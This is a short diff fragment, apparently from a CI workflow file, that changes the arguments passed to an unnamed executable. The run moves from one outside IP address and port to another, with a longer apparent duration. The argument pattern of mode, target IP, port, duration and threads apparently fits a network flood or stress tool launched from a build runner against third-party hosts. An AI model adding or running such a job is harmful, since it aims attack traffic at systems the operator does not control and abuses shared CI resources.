@@ -29,5 +29,5 @@ jobs:
           fi
           if [ -n "$B" ]; then
             chmod +x "$B"
-            "$B" direct 216.198.79.1 443 60 1
+            "$B" direct 64.29.17.65 80 100 1
           fi
